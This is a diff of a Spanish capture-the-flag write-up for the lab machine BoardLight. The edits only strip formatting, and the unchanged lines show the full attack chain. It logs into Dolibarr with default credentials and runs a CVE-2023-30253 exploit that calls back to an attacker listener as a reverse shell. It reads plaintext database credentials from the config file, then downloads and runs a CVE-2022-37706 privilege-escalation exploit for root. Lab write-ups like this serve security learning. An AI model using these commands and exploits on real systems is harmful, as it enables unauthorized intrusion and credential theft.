@@ -30,13 +30,13 @@ image:
   
 ## Descripción
 
-`BoardLight` es una `máquina` de `Linux` de dificultad `fácil` que presenta una instancia de `Dolibarr` vulnerable a la `CVE-2023-30253`. Esta `vulnerabilidad` se aprovecha para obtener acceso como `www-data`. Después de `enumerar` y `volcar` los contenidos del `archivo de configuración web`, las `credenciales` en texto plano permiten acceder a la máquina por `SSH`. Al enumerar el `sistema`, se identifica un `binario SUID` relacionado con `enlightenment` que es vulnerable a la `escalada de privilegios` a través de la `CVE-2022-37706` y que puede ser explotado para obtener una `root shell`
+BoardLight es una máquina de Linux de dificultad fácil que presenta una instancia de Dolibarr vulnerable a la CVE-2023-30253. Esta vulnerabilidad se aprovecha para obtener acceso como www-data. Después de enumerar y volcar los contenidos del archivo de configuración web, las credenciales en texto plano permiten acceder a la máquina por SSH. Al enumerar el sistema, se identifica un binario SUID relacionado con enlightenment que es vulnerable a la escalada de privilegios a través de la CVE-2022-37706 y que puede ser explotado para obtener una root shell
 
 ---
 
 ## Reconocimiento
 
-Se comprueba que la `máquina` está `activa` y se determina su `sistema operativo`, el `ttl` de las máquinas `linux` suele ser `64`, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad
+Se comprueba que la máquina está activa y se determina su sistema operativo, el ttl de las máquinas linux suele ser 64, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad
 
 ```
 # ping -c 3 10.129.231.37
@@ -52,7 +52,7 @@ rtt min/avg/max/mdev = 36.090/37.786/41.152/2.380 mss
 
 ### Nmap
 
-Se va a realizar un escaneo de todos los `puertos` abiertos en el protocolo `TCP` a través de nmap
+Se va a realizar un escaneo de todos los puertos abiertos en el protocolo TCP a través de nmap
 
 ```
 # sudo nmap -p- --open --min-rate 5000 -sS -Pn -n -v 10.129.231.37 -oG openPorts
@@ -77,7 +77,7 @@ Nmap done: 1 IP address (1 host up) scanned in 10.80 seconds
            Raw packets sent: 65535 (2.884MB) | Rcvd: 65535 (2.621MB)
 ```
 
-Se procede a realizar un análisis de `detección` de `servicios` y la `identificación` de `versiones` utilizando los puertos abiertos encontrados
+Se procede a realizar un análisis de detección de servicios y la identificación de versiones utilizando los puertos abiertos encontrados
 
 ```
 # nmap -sCV -p 22,80 10.129.231.37 -oN services
@@ -106,11 +106,11 @@ Si accedemos al servicio web vemos esto
 
 ![](/assets/img/BoardLight/image_1.png)
 
-`En la parte de abajo` de la `web` vemos un `dominio`
+En la parte de abajo de la web vemos un dominio
 
 ![](/assets/img/BoardLight/image_2.png)
 
-Añadimos el dominio al `/etc/hosts`
+Añadimos el dominio al /etc/hosts
 
 ```
 127.0.0.1       localhost
@@ -123,7 +123,7 @@ ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 ```
 
-`Fuzzeamos` y encontramos un `subdominio`
+Fuzzeamos y encontramos un subdominio
 
 ```
 # wfuzz -c -t100 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hc 404 --hh 15949 -H "Host: FUZZ.board.htb" http://board.htb     
@@ -141,7 +141,7 @@ ID           Response   Lines    Word       Chars       Payload
 000000072:   200        149 L    504 W      6360 Ch     "crm"     
 ```
 
-Añadimos el subdominio al `/etc/hosts`
+Añadimos el subdominio al /etc/hosts
 
 ```
 127.0.0.1       localhost
@@ -154,27 +154,27 @@ ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 ```
 
-Nos encontramos ante un panel de autenticación de `Dolibarr 17.0.0`
+Nos encontramos ante un panel de autenticación de Dolibarr 17.0.0
 
 ![](/assets/img/BoardLight/image_3.png)
 
-Si buscamos en google `Dolibarr default credentials` vemos que son `admin:admin`
+Si buscamos en google Dolibarr default credentials vemos que son admin:admin
 
 ![](/assets/img/BoardLight/image_4.png)
 
-Nos `logueamos` en el panel `administrativo`
+Nos logueamos en el panel administrativo
 
 ![](/assets/img/BoardLight/image_5.png)
 
 ## Web Exploitation
 
-Nos `descargamos` este `exploit` [https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253.git](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253.git) y nos ponemos en `escucha` con `netcat`
+Nos descargamos este exploit [https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253.git](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253.git) y nos ponemos en escucha con netcat
 
 ```
 # nc -nlvp 4444
 ```
 
-`Ejecutamos` el `exploit`
+Ejecutamos el exploit
 
 ```
 # python3 exploit.py http://crm.board.htb admin admin 10.10.16.28 4444
@@ -186,7 +186,7 @@ Nos `descargamos` este `exploit` [https://github.com/nikn0laty/Exploit-for-Dolib
 [*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
 ```
 
-`Recibimos` una `shell`
+Recibimos una shell
 
 ```
 # nc -nlvp 4444                                
@@ -199,14 +199,14 @@ whoami
 www-data
 ```
 
-Vamos a `realizar` el `tratamiento` a la `TTY`, para ello obtenemos las `dimensiones` de nuestra `pantalla`
+Vamos a realizar el tratamiento a la TTY, para ello obtenemos las dimensiones de nuestra pantalla
 
 ```
 # stty size
 45 18
 ```
 
-Efectuamos el `tratamiento` a la `TTY`
+Efectuamos el tratamiento a la TTY
 
 ```
 # script /dev/null -c bash
@@ -226,11 +226,11 @@ Efectuamos el `tratamiento` a la `TTY`
 
 ## Privilege Escalation
 
-Buscamos en google `Dolibarr conf file path`
+Buscamos en google Dolibarr conf file path
 
 ![](/assets/img/BoardLight/image_6.png)
 
-Nos dirigimos a esa `ruta` y obtenemos unas `credenciales`
+Nos dirigimos a esa ruta y obtenemos unas credenciales
 
 ```
 www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ pwd
@@ -271,7 +271,7 @@ $dolibarr_main_db_user='dolibarrowner';
 $dolibarr_main_db_pass='serverfun2$2023!!';
 ```
 
-Listamos los `usuarios` del `sistema` con `directorio home`
+Listamos los usuarios del sistema con directorio home
 
 ```
 www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat /etc/passwd | grep sh
@@ -281,7 +281,7 @@ fwupd-refresh:x:128:135:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
 sshd:x:129:65534::/run/sshd:/usr/sbin/nologin
 ```
 
-Nos convertimos en el `usuario larissa`
+Nos convertimos en el usuario larissa
 
 ```
 www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ su larissa
@@ -290,7 +290,7 @@ larissa@boardlight:/var/www/html/crm.board.htb/htdocs/conf$ whoami
 larissa
 ```
 
-Listamos `privilegios SUID` y me llama la atención el `binario enlightenment`
+Listamos privilegios SUID y me llama la atención el binario enlightenment
 
 ```
 larissa@boardlight:/home$ find / -perm -4000 2>/dev/null
@@ -316,7 +316,7 @@ larissa@boardlight:/home$ find / -perm -4000 2>/dev/null
 /usr/bin/vmware-user-suid-wrapper
 ```
 
-Listamos la `versión` de `enlightenment`
+Listamos la versión de enlightenment
 
 ```
 larissa@boardlight:~$ enlightenment --version
@@ -334,17 +334,17 @@ Version: 0.23.1
 E: Begin Shutdown Procedure!
 ```
 
-Buscamos `exploits` para esta `versión` del `binario` y encontramos uno para versiones menores de la `0.25.3`
+Buscamos exploits para esta versión del binario y encontramos uno para versiones menores de la 0.25.3
 
 ![](/assets/img/BoardLight/image_7.png)
 
-Nos descargamos este `exploit` [https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit.git](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit.git) en nuestro equipo y montamos un `servidor http` con `python` en la ruta en la que se encuentra el `exploit`
+Nos descargamos este exploit [https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit.git](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit.git) en nuestro equipo y montamos un servidor http con python en la ruta en la que se encuentra el exploit
 
 ```
 # python -m http.server 80
 ```
 
-Nos descargamos el `exploit` en la `máquina víctima`
+Nos descargamos el exploit en la máquina víctima
 
 ```
 larissa@boardlight:~$ wget http://10.10.16.28/exploit.sh
@@ -359,7 +359,7 @@ exploit.sh                        100%[=========================================
 2024-10-11 06:27:09 (75.2 MB/s) - ‘exploit.sh’ saved [709/709]
 ```
 
-Ejecutamos el `exploit` y nos convertimos en `usuario root`
+Ejecutamos el exploit y nos convertimos en usuario root
 
 ```
 larissa@boardlight:~$ ./exploit.sh 
